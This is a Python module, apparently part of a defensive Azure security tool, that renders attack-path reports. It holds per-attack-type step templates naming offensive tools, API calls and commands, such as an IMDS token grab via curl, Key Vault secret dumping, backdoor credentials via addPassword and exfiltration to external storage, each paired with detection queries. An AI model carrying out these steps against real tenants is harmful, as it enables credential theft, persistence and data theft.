"""
Attack Path Detection — Enterprise HTML Report.

Generates a self-contained, audit-ready HTML report with:
- Sidebar navigation (shared Fluent theme)
- Executive dashboard with SVG ring gauge, severity donut, KPI cards
- Interactive multi-node attack chain diagrams (SVG)
- MITRE ATT&CK heatmap matrix (tactics × techniques)
- Priority quadrant bubble chart (impact vs likelihood)
- Filterable / searchable finding cards with pagination
- Azure Portal deep links and remediation commands (CLI + PowerShell + Portal)
- Compliance framework mapping (NIST, CIS, HIPAA, PCI-DSS, ISO 27001, SOC 2)
- Document control, audit attestation, evidence summary
- Dark / light theme, accessibility (WCAG 2.1), print styles
"""
from __future__ import annotations

import hashlib
import html as _html
import json
import math
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path

from app.reports.shared_theme import get_css as _shared_css, get_js as _shared_js, esc as _theme_esc, VERSION

# ── Constants ────────────────────────────────────────────────────────────

_SEVERITY_COLORS = {
    "critical": "#D13438",
    "high": "#FF8C00",
    "medium": "#FFB900",
    "low": "#0078D4",
    "informational": "#6B6B6B",
}

_SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "informational": 4}

_TYPE_LABELS = {
    "privilege_escalation": "Privilege Escalation",
    "lateral_movement": "Lateral Movement",
    "exposed_high_value": "Exposed Resources",
    "credential_chain": "Credential Chain",
    "ca_bypass": "Conditional Access Bypass",
    "network_pivot": "Network Pivot",
    "pim_escalation": "PIM Escalation",
    "compromised_identity": "Compromised Identity",
    "consent_abuse": "Consent / OAuth Abuse",
    "custom_role_escalation": "Custom Role Escalation",
    "data_exposure": "Data Exposure",
    "ai_attack_surface": "AI Attack Surface",
    "cross_tenant": "Cross-Tenant Access",
}

_TYPE_ICONS = {
    "privilege_escalation": "⬆️",
    "lateral_movement": "↔️",
    "exposed_high_value": "🌐",
    "credential_chain": "🔑",
    "ca_bypass": "🛡️",
    "network_pivot": "🔀",
    "pim_escalation": "⏫",
    "compromised_identity": "👤",
    "consent_abuse": "📋",
    "custom_role_escalation": "⚙️",
    "data_exposure": "📂",
    "ai_attack_surface": "🤖",
    "cross_tenant": "🏢",
}

# Node type shapes & colors for chain diagrams
_NODE_STYLES = {
    "identity": {"shape": "rounded_rect", "fill": "#0078D4", "icon": "👤"},
    "application": {"shape": "rounded_rect", "fill": "#8764B8", "icon": "📱"},
    "compute": {"shape": "rect", "fill": "#00B7C3", "icon": "🖥️"},
    "resource": {"shape": "rect", "fill": "#107C10", "icon": "📦"},
    "network": {"shape": "diamond", "fill": "#F7630C", "icon": "🌐"},
    "permission": {"shape": "hexagon", "fill": "#FFB900", "icon": "🔐"},
    "privilege": {"shape": "hexagon", "fill": "#D13438", "icon": "⚡"},
    "role": {"shape": "hexagon", "fill": "#C239B3", "icon": "🎭"},
    "action": {"shape": "parallelogram", "fill": "#00B7C3", "icon": "→"},
    "exposure": {"shape": "parallelogram", "fill": "#FF8C00", "icon": "⚠️"},
    "impact": {"shape": "octagon", "fill": "#D13438", "icon": "💥"},
    "external": {"shape": "rounded_rect", "fill": "#8A8886", "icon": "🏢"},
    "config": {"shape": "rect", "fill": "#FFB900", "icon": "⚙️"},
}

# MITRE tactic display order
_TACTIC_ORDER = [
    "Initial Access", "Execution", "Persistence", "Privilege Escalation",
    "Defense Evasion", "Credential Access", "Discovery",
    "Lateral Movement", "Collection", "Exfiltration",
]

# Node type → step descriptions for animated sequence diagrams
_STEP_DESCRIPTIONS: dict[str, dict[str, str]] = {
    "identity": {"title": "Identity Compromise", "desc": "Authenticate or impersonate via stolen credentials, token replay, or phishing.", "protocol": "OAuth 2.0 / SAML", "permission": "User.Read / Directory.Read.All"},
    "application": {"title": "Application Exploitation", "desc": "Leverage app permissions or OAuth consent grants to access downstream resources.", "protocol": "MS Graph API", "permission": "Application.ReadWrite.All"},
    "compute": {"title": "Compute Access", "desc": "Access compute workloads (VMs, containers, serverless) via identity or network path.", "protocol": "Azure Resource Manager", "permission": "Contributor / VM Contributor"},
    "resource": {"title": "Resource Enumeration", "desc": "Enumerate and access target Azure resources using assigned role permissions.", "protocol": "Azure Resource Graph", "permission": "Reader / Resource-specific role"},
    "network": {"title": "Network Pivot", "desc": "Traverse network boundaries via exposed endpoints, peered VNets, or NSG misconfigurations.", "protocol": "TCP/IP / Azure Private Link", "permission": "Network Contributor"},
    "permission": {"title": "Permission Escalation", "desc": "Acquire elevated permissions through role assignment, PIM activation, or consent grants.", "protocol": "Azure RBAC / Entra ID", "permission": "RoleManagement.ReadWrite.Directory"},
    "privilege": {"title": "Privilege Acquisition", "desc": "Obtain high-privilege roles (Global Admin, Owner) through escalation chains.", "protocol": "Entra ID PIM / Azure RBAC", "permission": "Global Administrator / Owner"},
    "role": {"title": "Role Assignment Abuse", "desc": "Leverage or manipulate role assignments to gain access to protected scopes.", "protocol": "Azure RBAC", "permission": "User Access Administrator"},
    "action": {"title": "Attack Execution", "desc": "Execute the attack action \u2014 data access, configuration change, or lateral movement.", "protocol": "Varies", "permission": "Context-dependent"},
    "exposure": {"title": "Exposure Exploitation", "desc": "Exploit publicly accessible or misconfigured resource exposing sensitive data.", "protocol": "HTTPS / Public Endpoint", "permission": "Anonymous / Public Access"},
    "impact": {"title": "Impact Realization", "desc": "Final impact \u2014 data exfiltration, service disruption, or compliance violation.", "protocol": "N/A", "permission": "N/A"},
    "external": {"title": "External Entry", "desc": "External actor initiating attack from outside the tenant boundary.", "protocol": "Internet / Cross-Tenant", "permission": "None (unauthenticated)"},
    "config": {"title": "Config Weakness", "desc": "Misconfigured security setting creating an exploitable gap in defenses.", "protocol": "Azure Policy / Entra ID", "permission": "Varies"},
}

# ── Security Assessment Technical Profiles ───────────────────────────────

_PREREQS: dict[str, str] = {
    "privilege_escalation": "Valid credentials for a standard user account or service principal with basic directory read permissions. Attacker needs initial foothold in the tenant.",
    "lateral_movement": "Compromised service principal, managed identity, or user account with permissions to at least one Azure resource. Network access to Azure Resource Manager endpoints.",
    "exposed_high_value": "Network reachability to publicly exposed endpoints. May not require any Azure authentication if resources have anonymous access enabled.",
    "credential_chain": "Access to at least one credential store (Key Vault, app settings, environment variables) or a compromised identity with read access to secrets.",
    "ca_bypass": "Valid user credentials that match a gap in Conditional Access policy coverage. Attacker can authenticate from a non-compliant device or location.",
    "network_pivot": "Access to a resource within a VNet or subnet that has peering or routing to higher-value network segments. May leverage compromised VM or container.",
    "pim_escalation": "Eligible (not active) PIM role assignment for the target role. Attacker needs to satisfy any MFA or approval requirements for activation.",
    "compromised_identity": "Stolen credentials, session tokens, or access tokens for the target identity. May be obtained through phishing, token theft, or credential database breach.",
    "consent_abuse": "Ability to register or modify an application in Entra ID, or trick an administrator into consenting to malicious OAuth permissions.",
    "custom_role_escalation": "Existing assignment to a custom role with overly permissive action definitions, or the ability to modify custom role definitions.",
    "data_exposure": "Read access to storage accounts, databases, or file shares that contain sensitive data. May leverage overly broad RBAC assignments.",
    "ai_attack_surface": "Access to AI/ML endpoints, model APIs, or prompt injection vectors in deployed AI services.",
    "cross_tenant": "Cross-tenant access policy misconfiguration or B2B collaboration settings that allow external identity access.",
}

_IMPACT_MAP: dict[str, str] = {
    "privilege_escalation": "Full administrative control over tenant. Attacker can create backdoor accounts, modify security policies, exfiltrate all data, and persist indefinitely.",
    "lateral_movement": "Access to production data, secrets, and infrastructure beyond the initial compromise scope. Enables deeper penetration into the environment.",
    "exposed_high_value": "Direct access to sensitive data (PII, financial records, intellectual property) through publicly accessible or misconfigured resources.",
    "credential_chain": "Access to stored secrets enables impersonation of service principals and access to downstream resources protected by those credentials.",
    "ca_bypass": "Authentication bypass allows full account access without MFA or device compliance checks, undermining Zero Trust architecture.",
    "network_pivot": "Attacker can reach previously isolated network segments containing databases, internal APIs, and management interfaces.",
    "pim_escalation": "Temporary or permanent acquisition of high-privilege roles (Global Admin, Owner) through PIM abuse.",
    "compromised_identity": "Full access to all resources and data accessible by the compromised identity, including email, files, and application data.",
    "consent_abuse": "Persistent access to user data and organizational resources through malicious OAuth application permissions.",
    "custom_role_escalation": "Custom role with excessive permissions grants unintended access to sensitive operations and data.",
    "data_exposure": "Direct exposure of sensitive data (PII, PHI, financial) to unauthorized parties, creating compliance and regulatory risk.",
    "ai_attack_surface": "Manipulation of AI model outputs, data poisoning, or unauthorized access to training data and model endpoints.",
    "cross_tenant": "External actors gain access to internal resources through misconfigured cross-tenant trust relationships.",
}

_DETECTION_MAP: dict[str, list[str]] = {
    "privilege_escalation": [
        "Monitor 'Add member to role' events in Entra ID audit logs",
        "Alert on Global Admin or Owner role assignments outside change windows",
        "Track PIM activation patterns for anomalous timing or frequency",
        "Review Microsoft Sentinel 'Privileged Role Assigned' analytic rule",
    ],
    "lateral_movement": [
        "Monitor cross-resource access patterns in Azure Activity Log",
        "Alert on service principal access to resources outside normal scope",
        "Track Resource Graph queries from unexpected identities",
        "Review Azure Network Watcher flow logs for unusual traffic",
    ],
    "exposed_high_value": [
        "Monitor for public endpoint configuration changes",
        "Alert on storage account anonymous access enablement",
        "Track Key Vault access policy modifications",
        "Review Azure Policy compliance for exposure-related policies",
    ],
    "credential_chain": [
        "Monitor Key Vault secret read operations from new identities",
        "Alert on bulk secret enumeration attempts",
        "Track application credential rotation events",
        "Review sign-in logs for service principal authentication anomalies",
    ],
    "ca_bypass": [
        "Monitor Conditional Access policy modification events",
        "Alert on sign-ins from non-compliant devices or untrusted locations",
        "Track named location and policy exclusion changes",
        "Review risky sign-in detections in Identity Protection",
    ],
    "network_pivot": [
        "Monitor VNet peering and NSG rule change events",
        "Alert on new private endpoint or service endpoint configurations",
        "Track VM and container network interface changes",
        "Review Azure Firewall and WAF logs for pivot indicators",
    ],
    "pim_escalation": [
        "Monitor PIM role activation events in Entra ID audit logs",
        "Alert on activations that bypass approval workflows",
        "Track eligible assignment additions for high-privilege roles",
        "Review PIM activation justifications for anomalous patterns",
    ],
    "compromised_identity": [
        "Monitor Identity Protection risk detections (atypical travel, token anomalies)",
        "Alert on impossible travel sign-in events",
        "Track MFA registration changes and password resets",
        "Review mailbox forwarding rule modifications",
    ],
    "consent_abuse": [
        "Monitor application consent grant events in Entra audit logs",
        "Alert on admin consent for high-privilege Graph API permissions",
        "Track new application registrations with Mail.Read or similar scopes",
        "Review risky application detections in Cloud App Security",
    ],
    "custom_role_escalation": [
        "Monitor custom role definition create/update events",
        "Alert on role assignments using custom roles with wildcard actions",
        "Track role definition changes that expand action scopes",
        "Review RBAC assignment changes in Azure Activity Log",
    ],
    "data_exposure": [
        "Monitor storage account access tier and policy changes",
        "Alert on database firewall rule modifications",
        "Track data classification label changes in Purview",
        "Review Azure Policy compliance for data protection policies",
    ],
    "ai_attack_surface": [
        "Monitor AI service endpoint access patterns",
        "Alert on unusual API call volumes to model endpoints",
        "Track model deployment and configuration changes",
        "Review AI service diagnostic logs for prompt injection attempts",
    ],
    "cross_tenant": [
        "Monitor cross-tenant access policy modifications",
        "Alert on B2B collaboration setting changes",
        "Track external identity sign-in patterns",
        "Review cross-tenant access logs for unexpected domains",
    ],
}

# ── Rich per-path-type sequence step templates ───────────────────────────
# Each template is a list of step dicts, parameterized with placeholders that
# are interpolated from the actual path's chain data at render time.
# Placeholders: {app}, {target}, {perms}, {consent_type}, {mitre}, {tactic},
#               {scope}, {first}, {last}.
# Each step dict has: title, why, how, tools, api, permission, mitre, detection, prereq.
_PATH_STEP_TEMPLATES: dict[str, list[dict]] = {
    "consent_abuse": [
        {
            "title": "Reconnaissance: Enumerate OAuth Apps",
            "why": "Identify applications holding risky delegated or application permissions across the tenant.",
            "how": "Query MS Graph for service principals and oauth2PermissionGrants, filtering by consentType to find tenant-wide grants.",
            "tools": "MS Graph API, AzureAD PowerShell, ROADtools, AADInternals",
            "api": "GET /v1.0/oauth2PermissionGrants?$filter=consentType eq 'AllPrincipals'",
            "permission": "Application.Read.All (read-only)",
            "mitre": "T1087.004 — Cloud Account Discovery",
            "detection": "AuditLogs | where OperationName == 'Consent to application' | summarize by AppDisplayName, ConsentType",
            "prereq": "Standard user with Directory.Read.All consent (default in most tenants)",
        },
        {
            "title": "Identify Over-Permissioned Target",
            "why": "Target app '{app}' holds {perms_count} dangerous delegated permission(s): {perms}. Consent scope: {consent_type}.",
            "how": "Inspect the consent grant: principalId is null (tenant-wide) and scope contains read/write permissions on user data such as Files.ReadWrite.All or Mail.ReadWrite.",
            "tools": "MS Graph Explorer, Azure Portal → Enterprise Applications, az ad sp list",
            "api": "GET /v1.0/servicePrincipals/{id}/oauth2PermissionGrants",
            "permission": "Application.Read.All",
            "mitre": "T1078.004 — Valid Accounts: Cloud Accounts",
            "detection": "Alert on apps with high-risk delegated scopes (Mail.ReadWrite, Files.ReadWrite.All, Sites.FullControl.All) granted as AllPrincipals to a non-Microsoft publisher",
            "prereq": "Reconnaissance complete; target app '{app}' identified",
        },
        {
            "title": "Acquire Access Token via Compromised Identity",
            "why": "Need a valid user token in the tenant — token will inherit ALL of the target app's delegated scopes for that user.",
            "how": "Phish a user, replay a stolen session token, or run device-code flow on a compromised endpoint. Any tenant user works because consent is AllPrincipals.",
            "tools": "evilginx2, AADInternals (Get-AADIntAccessTokenForGraph), TokenTactics, TeamFiltration",
            "api": "POST /common/oauth2/v2.0/token (grant_type=device_code | refresh_token)",
            "permission": "ANY valid user credential — no admin required",
            "mitre": "T1528 — Steal Application Access Token",
            "detection": "SigninLogs | where ResultType == 0 and DeviceDetail.isCompliant == false | unusual location/IP for user",
            "prereq": "Tenant-wide consent already in place (from previous step)",
        },
        {
            "title": "Abuse Delegated Permissions to Reach {target}",
            "why": "Use the elevated app context with the user token to read/write {scope} across the tenant boundary.",
            "how": "Call MS Graph endpoints. Permissions like Files.ReadWrite.All let the attacker enumerate and exfiltrate every user's OneDrive content with one token.",
            "tools": "MS Graph SDK (any language), curl, az rest, custom OAuth client",
            "api": "GET /v1.0/users/{user-id}/drive/root/children  •  GET /v1.0/users/{user-id}/messages",
            "permission": "{perms}",
            "mitre": "{mitre}",
            "detection": "MS Graph Activity logs: cross-user data access from a single (app,user) pair within a short time window; spike in /users/*/drive or /users/*/messages calls",
            "prereq": "Valid user token with delegated permission scope from previous step",
        },
        {
            "title": "Persist via Refresh Token",
            "why": "Refresh tokens stay valid for 90 days by default and can outlive password resets when CAE is not enforced.",
            "how": "Capture and store the refresh token; trade it for fresh access tokens on demand without re-authenticating the user.",
            "tools": "TokenTactics (Invoke-RefreshToMSGraphToken), custom OAuth client",
            "api": "POST /common/oauth2/v2.0/token (grant_type=refresh_token)",
            "permission": "Continued delegated access for token lifetime",
            "mitre": "T1098.003 — Account Manipulation: Additional Cloud Roles",
            "detection": "Enable Continuous Access Evaluation (CAE); revoke-signinSessions Graph API; alert on long-lived service-principal sessions with no interactive sign-in",
            "prereq": "Captured refresh token from previous step",
        },
    ],
    "privilege_escalation": [
        {
            "title": "Establish Initial Foothold",
            "why": "Need a starting identity in the tenant — typically a low-privilege user or service principal.",
            "how": "Phish a standard user, compromise a developer workstation, or abuse a leaked service-principal secret from public source code.",
            "tools": "evilginx2, GitHub secret-scanning bypass, MicroBurst, ROADtools",
            "api": "POST /common/oauth2/v2.0/token",
            "permission": "Any valid tenant identity",
            "mitre": "T1078.004 — Valid Accounts: Cloud Accounts",
            "detection": "Identity Protection risk detections; sign-ins from anonymous IPs or unfamiliar locations",
            "prereq": "Network reachability to login.microsoftonline.com",
        },
        {
            "title": "Enumerate Role Assignments",
            "why": "Identify which roles (RBAC, Entra directory, PIM-eligible) are assigned to '{first}' and reachable through indirect membership.",
            "how": "Query Azure Resource Manager and Microsoft Graph for roleAssignments and directoryRoles. Walk group memberships to find inherited privileges.",
            "tools": "az role assignment list, ROADrecon, AzureHound, Stormspotter",
            "api": "GET /providers/Microsoft.Authorization/roleAssignments  •  GET /v1.0/directoryRoles",
            "permission": "Reader on subscription, Directory.Read.All on Entra",
            "mitre": "T1069.003 — Permission Groups Discovery: Cloud Groups",
            "detection": "Alert on bulk roleAssignment GET calls from a single principal; AzureActivity | where OperationNameValue contains 'roleAssignments/read'",
            "prereq": "Initial foothold from previous step",
        },
        {
            "title": "Identify Escalation Path to {target}",
            "why": "Map a chain from current privilege to the target role '{target}' through PIM eligibility, group membership, or owner-of relationships.",
            "how": "BloodHound-style graph traversal: edge types include MemberOf, OwnerOf, EligibleFor, CanReset, GrantConsent. Look for shortest path to Global Admin / Owner / User Access Admin.",
            "tools": "AzureHound + BloodHound, ROADtools (roadrecon), Stormspotter",
            "api": "GET /v1.0/groups/{id}/members  •  GET /v1.0/roleManagement/directory/roleEligibilityScheduleInstances",
            "permission": "Directory.Read.All",
            "mitre": "T1069 — Permission Groups Discovery",
            "detection": "Alert on AzureHound/ROADrecon-style enumeration patterns: high-volume Graph reads against group/role endpoints from a non-admin user",
            "prereq": "Role inventory from previous step",
        },
        {
            "title": "Trigger Role Activation or Assignment",
            "why": "Convert eligibility into active privilege, or self-assign a role through abused permissions on the role-assignment API.",
            "how": "PIM activation (with bypass of MFA/approval gaps) OR direct PUT to /roleAssignments using stolen User Access Administrator scope.",
            "tools": "az role assignment create, MS Graph PIM API, MicroBurst Invoke-AzRoleAdd",
            "api": "POST /v1.0/roleManagement/directory/roleAssignmentScheduleRequests  •  PUT /providers/Microsoft.Authorization/roleAssignments/{guid}",
            "permission": "RoleManagement.ReadWrite.Directory  OR  Microsoft.Authorization/roleAssignments/write",
            "mitre": "T1098.003 — Account Manipulation: Additional Cloud Roles",
            "detection": "AuditLogs | where OperationName in ('Add member to role', 'Add eligible member to role'); Sentinel rule 'Privileged Role Assigned'",
            "prereq": "Escalation path identified in previous step",
        },
        {
            "title": "Validate Elevation and Persist",
            "why": "Confirm the new role is active and create durable persistence so the privilege survives detection.",
            "how": "Re-authenticate to acquire a fresh token reflecting the new role. Add a backdoor service principal credential, register a malicious app, or add a secondary admin.",
            "tools": "az account get-access-token, MicroBurst Invoke-AzCreateBackdoor, MS Graph addPassword",
            "api": "POST /v1.0/applications/{id}/addPassword  •  POST /v1.0/servicePrincipals/{id}/addKey",
            "permission": "Acquired admin role from previous step",
            "mitre": "T1098.001 — Additional Cloud Credentials",
            "detection": "Alert on addPassword/addKey on highly-privileged service principals; new owner added to break-glass accounts",
            "prereq": "Role activation succeeded",
        },
    ],
    "lateral_movement": [
        {
            "title": "Inventory Accessible Resources",
            "why": "Map the blast radius of '{first}' — list every subscription, resource group, and resource it can read or write.",
            "how": "Run Resource Graph queries scoped to the compromised identity to enumerate role assignments and reachable resources.",
            "tools": "Azure Resource Graph (az graph query), AzureHound, Stormspotter, ROADrecon",
            "api": "POST /providers/Microsoft.ResourceGraph/resources",
            "permission": "Reader (effective)",
            "mitre": "T1580 — Cloud Infrastructure Discovery",
            "detection": "Alert on Resource Graph query bursts > N/min from a single principal; AzureActivity reads against /providers across many resource types",
            "prereq": "Compromised identity with at least Reader scope",
        },
        {
            "title": "Pivot via Managed Identity or Stored Credential",
            "why": "Use credentials embedded in the compromised resource to step into adjacent resources.",
            "how": "On a compromised VM hit IMDS at 169.254.169.254 to grab the managed-identity token; or read app-settings / Key Vault secrets and reuse them.",
            "tools": "MicroBurst (Get-AzVMExtensionSettings), curl 169.254.169.254, az keyvault secret list",
            "api": "GET http://169.254.169.254/metadata/identity/oauth2/token  •  GET /vaults/{name}/secrets",
            "permission": "Local execution on resource OR Key Vault Secrets User",
            "mitre": "T1552.005 — Cloud Instance Metadata API",
            "detection": "Alert on Key Vault secret-read bursts from new client IPs; VM Insights for unexpected outbound to login.microsoftonline.com",
            "prereq": "Resource inventory complete; compromised resource identified",
        },
        {
            "title": "Move Laterally to {target}",
            "why": "Use the captured managed-identity token to reach '{target}' — typically a higher-value resource holding sensitive data.",
            "how": "Authenticate to ARM/Graph with the new token; the token's audience and scope determine which resources are reachable in one hop.",
            "tools": "az login --identity, MS Graph SDK, custom REST",
            "api": "PUT /subscriptions/{sub}/resourceGroups/{rg}/providers/{type}/{name}",
            "permission": "Inherited from managed identity",
            "mitre": "{mitre}",
            "detection": "AzureActivity | where Caller != originalCaller and ClientIPAddress within attack-window; cross-resource access from previously-quiet identity",
            "prereq": "Managed-identity token from previous step",
        },
        {
            "title": "Establish Persistence in Target",
            "why": "Plant a durable foothold so the lateral access survives token expiry and patching.",
            "how": "Create new role assignment for an attacker-controlled identity; add SSH key / RDP user; install scheduled task or function-app trigger.",
            "tools": "az role assignment create, az vm run-command invoke, custom Function App",
            "api": "PUT /providers/Microsoft.Authorization/roleAssignments/{guid}",
            "permission": "Owner or User Access Administrator on target scope",
            "mitre": "T1136.003 — Create Account: Cloud Account",
            "detection": "Alert on new roleAssignment to non-corporate identity; Defender for Cloud anomaly on VM/storage configuration change",
            "prereq": "Lateral access to target from previous step",
        },
    ],
    "credential_chain": [
        {
            "title": "Locate Credential Store",
            "why": "Find Key Vaults, app settings, environment variables, or pipeline variable groups that house secrets.",
            "how": "Enumerate Key Vaults via Resource Graph; read app settings via ARM; pull pipeline variables via Azure DevOps API.",
            "tools": "az keyvault list, az webapp config appsettings list, ROADrecon, MicroBurst Get-AzKeyVaultKeysAndSecrets",
            "api": "GET /providers/Microsoft.KeyVault/vaults  •  GET /sites/{name}/config/appsettings",
            "permission": "Reader on the vault/resource",
            "mitre": "T1552.001 — Credentials in Files",
            "detection": "Alert on bulk Key Vault listing from new principal; AppService config reads outside change windows",
            "prereq": "Compromised identity with Reader",
        },
        {
            "title": "Enumerate and Extract Secrets",
            "why": "Dump every secret/key/certificate the identity can read from '{first}'.",
            "how": "Iterate /secrets endpoints; for soft-deleted secrets call /deletedSecrets to recover historic credentials.",
            "tools": "az keyvault secret list, MicroBurst Get-AZKeyVaultKeysAndSecrets, KeyVault.SecretClient SDK",
            "api": "GET /vaults/{name}/secrets  •  GET /vaults/{name}/secrets/{name}",
            "permission": "Key Vault Secrets User OR get/list on access policy",
            "mitre": "T1555.006 — Cloud Secrets Management Stores",
            "detection": "KeyVaultData | where OperationName == 'SecretGet' | summarize count() by CallerIPAddress; alert on > N reads/hr",
            "prereq": "Vault located in previous step",
        },
        {
            "title": "Test Credentials and Identify High-Value Ones",
            "why": "Most extracted secrets are for downstream services — identify which ones unlock '{target}'.",
            "how": "Pattern-match secret names (sql-conn, sp-clientid, github-pat); attempt login per secret type.",
            "tools": "TruffleHog regex patterns, custom credential-tester scripts",
            "api": "Varies per credential type",
            "permission": "Depends on credential type",
            "mitre": "T1110.004 — Credential Stuffing",
            "detection": "Alert on new IPs authenticating with service-principal client_secret; failed-then-success pattern across many service principals",
            "prereq": "Secret dump from previous step",
        },
        {
            "title": "Pivot to {target} Using Stolen Credential",
            "why": "Use the validated credential to access '{target}' under a different (often higher-privileged) identity.",
            "how": "Authenticate as the service principal / database user / API client and execute the attacker's objective.",
            "tools": "az login --service-principal, sqlcmd, GitHub CLI, custom",
            "api": "POST /tenants/{tid}/oauth2/v2.0/token (client_credentials)",
            "permission": "Inherited from stolen credential",
            "mitre": "{mitre}",
            "detection": "SigninLogs | where ServicePrincipalName == compromised SP and IPAddress not in known-good list",
            "prereq": "Validated high-value credential from previous step",
        },
    ],
    "exposed_high_value": [
        {
            "title": "Discover Public Endpoint",
            "why": "Find resources reachable from the internet without authentication — '{first}' is exposed at the edge.",
            "how": "Internet scanning (Shodan/Censys), Azure resource fingerprinting via wildcard DNS, public-IP enumeration.",
            "tools": "Shodan, Censys, Subfinder, masscan, custom Azure-asset crawlers",
            "api": "GET https://{resource}.{azure-suffix}/  (anonymous probe)",
            "permission": "None — anonymous",
            "mitre": "T1595.002 — Active Scanning: Vulnerability Scanning",
            "detection": "Defender for Cloud 'Public access' alerts; AzureActivity on storage account anonymous-access enablement",
            "prereq": "Internet access",
        },
        {
            "title": "Probe Access Controls",
            "why": "Confirm the endpoint allows anonymous reads and identify the data scope of '{target}'.",
            "how": "Enumerate containers/buckets/databases, attempt anonymous reads, parse error responses for valid resource names.",
            "tools": "MicroBurst Invoke-EnumerateAzureBlobs, AzureBlobEnum, custom curl loops",
            "api": "GET https://{account}.blob.core.windows.net/?restype=container&comp=list",
            "permission": "Anonymous",
            "mitre": "T1530 — Data from Cloud Storage Object",
            "detection": "StorageBlobLogs | where AuthenticationType == 'Anonymous' and StatusText == 'Success'",
            "prereq": "Endpoint discovered",
        },
        {
            "title": "Enumerate and Exfiltrate Data",
            "why": "Pull '{target}' out of the exposed store before the misconfiguration is closed.",
            "how": "Recursive listing followed by parallel download; stream to attacker-controlled storage outside the tenant.",
            "tools": "azcopy, rclone, custom multi-threaded downloader",
            "api": "GET https://{account}.blob.core.windows.net/{container}/{blob}",
            "permission": "Anonymous OR misconfigured SAS",
            "mitre": "T1567.002 — Exfiltration to Cloud Storage",
            "detection": "Storage egress spike; > N GET requests with anonymous auth in short window; alert on large download to external IP",
            "prereq": "Anonymous access confirmed",
        },
    ],
    "ca_bypass": [
        {
            "title": "Enumerate Conditional Access Policies",
            "why": "Identify gaps in CA coverage — exclusions, missing user groups, missing locations, or device-state weaknesses.",
            "how": "Read CA policies via Graph API; map exclusions, skipped apps, and the trusted-network ranges.",
            "tools": "MS Graph (conditionalAccessPolicies), DCToolbox, ROADrecon",
            "api": "GET /v1.0/identity/conditionalAccess/policies",
            "permission": "Policy.Read.ConditionalAccess",
            "mitre": "T1087.004 — Cloud Account Discovery",
            "detection": "Alert on conditionalAccess policies read by non-admin; baseline known callers",
            "prereq": "Standard user with Policy.Read.ConditionalAccess (often default)",
        },
        {
            "title": "Identify Bypass Vector",
            "why": "Find the specific gap — an excluded user, an excluded app, a trusted IP range, or a device-compliance hole.",
            "how": "Cross-reference policy conditions with the target user's group membership and the attacker's network position.",
            "tools": "DCToolbox Test-DCConditionalAccess, custom analysis",
            "api": "GET /v1.0/users/{id}/memberOf",
            "permission": "Directory.Read.All",
            "mitre": "T1556.007 — Modify Authentication Process: Hybrid Identity",
            "detection": "Alert on policies with 'excludeUsers' or 'excludeGroups' modifications; review break-glass exclusions monthly",
            "prereq": "CA policy inventory from previous step",
        },
        {
            "title": "Authenticate via Bypass Vector",
            "why": "Sign in through the gap to reach '{target}' without satisfying MFA or device-compliance controls.",
            "how": "Connect from the trusted IP range, use the excluded service-account credential, or use a legacy auth protocol still allowed by policy.",
            "tools": "Stolen creds + VPN to trusted range, MFASweep, legacy IMAP/POP3 client",
            "api": "POST /common/oauth2/v2.0/token  •  Legacy SMTP/IMAP AUTH",
            "permission": "Stolen user credentials",
            "mitre": "T1078.004 — Valid Accounts: Cloud Accounts",
            "detection": "SigninLogs | where ConditionalAccessStatus == 'notApplied' and ResultType == 0 and unusual user/app combination",
            "prereq": "Bypass vector identified",
        },
        {
            "title": "Access {target}",
            "why": "Once past the auth gate, all resources in the user's scope are reachable as if MFA had succeeded.",
            "how": "Use the access token returned by the bypass to call ARM/Graph endpoints normally.",
            "tools": "az cli, MS Graph SDK",
            "api": "Varies",
            "permission": "Inherited from compromised identity",
            "mitre": "{mitre}",
            "detection": "Cross-correlate with sign-in risk; alert on token use from new IP after bypass-pattern sign-in",
            "prereq": "Bypass authentication succeeded",
        },
    ],
    "pim_escalation": [
        {
            "title": "Enumerate Eligible Role Assignments",
            "why": "Find PIM-eligible (not active) roles assigned to '{first}' that can be activated for elevation.",
            "how": "Query the PIM API for roleEligibilityScheduleInstances; map each eligibility to its target scope.",
            "tools": "MS Graph PIM API, PIM PowerShell module, ROADrecon",
            "api": "GET /v1.0/roleManagement/directory/roleEligibilityScheduleInstances",
            "permission": "RoleEligibilitySchedule.Read.Directory",
            "mitre": "T1069.003 — Permission Groups Discovery: Cloud Groups",
            "detection": "Alert on bulk PIM eligibility reads from non-admin; baseline expected callers",
            "prereq": "Foothold as '{first}' with read on PIM",
        },
        {
            "title": "Bypass MFA / Approval Gates",
            "why": "Activation requires MFA + (optionally) approval. Bypass via excluded device, captured TOTP, or self-approval misconfig.",
            "how": "Use a previously-MFA'd browser session, prompt-bomb the user, or exploit a policy that allows self-approval for the target role.",
            "tools": "evilginx2, MFASweep, Microsoft Authenticator push-bomb",
            "api": "Varies — depends on bypass technique",
            "permission": "Captured MFA-completed session",
            "mitre": "T1621 — Multi-Factor Authentication Request Generation",
            "detection": "AuditLogs | where OperationName == 'Update user' and TargetResources.modifiedProperties contains 'StrongAuthenticationMethod'; MFA fatigue analytic rule",
            "prereq": "Eligible role identified in previous step",
        },
        {
            "title": "Activate Role to {target}",
            "why": "Promote eligibility into active assignment, granting full role permissions for the activation duration (typically 1–8 hours).",
            "how": "POST a roleAssignmentScheduleRequest with action='selfActivate' and a justification string. Token must be re-acquired to reflect activation.",
            "tools": "MS Graph (POST /roleManagement/directory/roleAssignmentScheduleRequests), Az PIM module",
            "api": "POST /v1.0/roleManagement/directory/roleAssignmentScheduleRequests",
            "permission": "RoleAssignmentSchedule.ReadWrite.Directory + eligibility for target role",
            "mitre": "T1098.003 — Account Manipulation: Additional Cloud Roles",
            "detection": "AuditLogs | where OperationName == 'Add eligible member to role completed (PIM activation)'; Sentinel rule 'PIM Activation by Risky User'",
            "prereq": "MFA / approval gate cleared",
        },
        {
            "title": "Use Elevated Access and Persist",
            "why": "Activation window is short; persist via backdoor credentials before role expires.",
            "how": "Add a permanent (non-PIM) role assignment for an attacker-owned identity; create a backdoor service principal with addPassword.",
            "tools": "az role assignment create (no --assignee-principal-type), MS Graph addPassword",
            "api": "PUT /providers/Microsoft.Authorization/roleAssignments/{guid}",
            "permission": "Active role from previous step",
            "mitre": "T1098.001 — Additional Cloud Credentials",
            "detection": "Permanent role assignment created within PIM activation window; new credential on highly-privileged SP",
            "prereq": "Active PIM role",
        },
    ],
    "data_exposure": [
        {
            "title": "Discover Misconfigured Data Store",
            "why": "Locate '{first}' — a storage account, database, or file share with overly permissive access controls.",
